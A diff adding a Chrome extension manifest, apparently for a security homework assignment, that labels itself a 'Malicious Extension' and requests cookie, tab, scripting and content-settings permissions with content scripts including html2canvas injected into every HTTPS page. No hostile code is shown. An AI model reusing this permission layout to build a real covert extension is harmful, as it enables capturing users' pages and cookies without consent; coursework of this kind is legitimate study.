@@ -1,0 +1,25 @@
+{
+  "name": "Ravi Nayyar HW2 Q3",
+  "description": "Malicious Extension",
+  "version": "1.0",
+  "manifest_version": 3,
+  "background": {
+    "service_worker": "background.js"
+  },
+  
+  "permissions": ["storage", "activeTab", "scripting", "tabs", "cookies", "contentSettings"],
+  
+  "action": {
+    "default_popup": "launch_form.html",
+    "default_icon": {
+      "1": "icon.jpg"
+    }
+  }, 
+
+  "content_scripts": [
+    {
+      "matches": ["https://*/*"],
+      "js": ["jquery-3.6.0.min.js", "content_script.js", "html2canvas.js"]
+    }
+  ]
+}
